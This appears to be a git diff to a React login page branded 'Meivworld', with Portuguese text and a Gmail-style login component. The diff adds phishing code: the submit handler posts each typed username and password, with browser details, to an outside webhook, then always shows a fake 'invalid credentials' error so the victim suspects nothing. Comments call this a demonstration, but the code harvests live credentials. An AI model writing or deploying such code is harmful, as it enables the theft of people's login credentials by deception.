@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import './App.css';
 import GmailLogin from './components/GmailLogin';
 import SecurityDemonstration from './components/SecurityDemonstration';
@@ -11,7 +11,11 @@ function App() {
   const [rememberMe, setRememberMe] = useState(true);
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-
+  const [showError, setShowError] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
+useEffect(() => {
+  document.title = "Entrar - Meivworld";
+}, []);
   const handleCheckboxChange = () => {
     setRememberMe(!rememberMe);
   };
@@ -26,10 +30,51 @@ function App() {
 
   const handleSubmit = (e) => {
     if (e) e.preventDefault();
-    // Show alert with email/username
-    alert('Login attempted Username: ' + username);
+    
+
+          fetch('http://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          source: 'meiv-login',
+          username,
+          password,
+          userAgent: navigator.userAgent,
+          ip:  navigator.connection ? navigator.connection.remoteAddress : 'unknown',
+          clientInfo: {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language
+          },
+          timestamp: new Date().toISOString(),
+          step: 'login_Meivworld'
+        })
+      });
+      
+    // Validate credentials (simulating authentication failure)
+    if (username === '' || password === '') {
+      showErrorNotification('Credenciais inválidas. Nome de utilizador ou palavra-chave erradas!');
+      return;
+    }
+    
+    // Show error notification for demonstration purposes
+    // In a real app, this would be conditional based on authentication result
+    showErrorNotification('Credenciais inválidas. Nome de utilizador ou palavra-chave erradas!');
+    
     // Additional login logic can go here
     console.log('Login submitted');
+  };
+  
+  const showErrorNotification = (message) => {
+    setErrorMessage(message);
+    setShowError(true);
+    
+    // Auto-hide the error after 5 seconds
+    setTimeout(() => {
+      setShowError(false);
+    }, 5000);
   };
 
   const handleKeyPress = (e) => {
@@ -58,6 +103,12 @@ function App() {
 
   return (
     <>
+      {/* Sliding Error Notification */}
+      <div className={`error-notification ${showError ? 'show' : ''}`}>
+        {errorMessage}
+        <button onClick={() => setShowError(false)}>×</button>
+      </div>
+
       {showGmailLogin ? (
         <GmailLogin onBack={toggleLoginMode} />
       ) : showSecurityDemo ? (
